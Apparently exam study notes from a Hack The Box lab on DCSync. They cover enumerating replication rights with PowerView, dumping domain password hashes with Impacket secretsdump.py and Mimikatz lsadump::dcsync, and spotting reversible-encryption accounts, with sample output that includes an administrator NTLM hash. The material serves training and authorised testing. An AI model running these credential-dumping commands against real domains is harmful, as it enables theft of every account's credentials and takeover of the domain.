# DCSync

## 1. Required Permissions

DCSync abuses AD replication to extract domain credential data.

Required rights:
- `DS-Replication-Get-Changes`
- `DS-Replication-Get-Changes-All`

## 2. Enumerate DCSync Permissions

### Get User SID

```powershell
Get-DomainUser -Identity adunn |
    Select samaccountname, objectsid, memberof, useraccountcontrol |
    Format-List
```

### Check Replication Rights

```powershell
$sid = "S-1-5-21-3842939050-3880317879-2865463114-1164"

Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs |
    Where-Object { $_.ObjectAceType -match 'Replication-Get' } |
    Where-Object { $_.SecurityIdentifier -match $sid } |
    Select AceQualifier, ObjectDN, ActiveDirectoryRights, SecurityIdentifier, ObjectAceType |
    Format-List
```

**Look for:** `DS-Replication-Get-Changes` and `DS-Replication-Get-Changes-All`.

## 3. DCSync Using Impacket (Linux)

### Dump Domain Hashes

**Original HTB example:**

```bash
secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5
```

### Extract Only NTLM Hashes

```bash
secretsdump.py -just-dc-ntlm INLANEFREIGHT/adunn@172.16.5.5
```

### Extract a Specific User

```bash
secretsdump.py -just-dc-user administrator INLANEFREIGHT/adunn@172.16.5.5
```

### Important Options

| Option | Purpose |
|---|---|
| `-just-dc` | Extract NTLM hashes and Kerberos keys. |
| `-just-dc-ntlm` | Extract NTLM hashes only. |
| `-just-dc-user USER` | Extract data for a specific user. |
| `-history` | Include password history. |
| `-pwd-last-set` | Show password last-set information. |
| `-user-status` | Show account status information. |
| `-outputfile PREFIX` | Save results to files. |

### Output Files

```text
inlanefreight_hashes.ntds
inlanefreight_hashes.ntds.cleartext
inlanefreight_hashes.ntds.kerberos
```

## 4. DCSync Using Mimikatz (Windows)

### Run as the DCSync-Privileged User

```cmd
runas /netonly /user:INLANEFREIGHT\adunn powershell
```

### Execute Mimikatz

```text
privilege::debug
```

### Extract Administrator Hash

**Original HTB example:**

```text
lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\administrator
```

**Output to identify:**

```text
SAM Username : administrator
Object Relative ID : 500
Hash NTLM : 88ad09182de639ccc6579eb0849751cf
```

## 5. Enumerate Reversible Password Encryption

Accounts with `ENCRYPTED_TEXT_PWD_ALLOWED` may contain recoverable password data.

### PowerView

```powershell
Get-DomainUser -Identity * |
    Where-Object {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |
    Select samaccountname, useraccountcontrol
```

### Active Directory PowerShell

```powershell
Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
```

## 6. NTLM Hash Format

```text
DOMAIN\username:RID:LM_HASH:NTLM_HASH:::
```

- **RID 500** = Built-in Administrator account.
- **NTLM_HASH** = Password-derived NTLM hash.
- `-just-dc-ntlm` = NTLM hashes only.

## 7. Exam Workflow

1. Enumerate the user with `Get-DomainUser`.
2. Check domain ACLs with `Get-ObjectAcl`.
3. Confirm replication rights.
4. Use `secretsdump.py` (Linux) or Mimikatz (Windows).
5. Extract all hashes or target a specific user.

**Remember:**
- Enumeration: `Get-DomainUser`, `Get-ObjectAcl`
- Linux: `secretsdump.py -just-dc`
- Windows: `lsadump::dcsync`
- Required rights: `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`
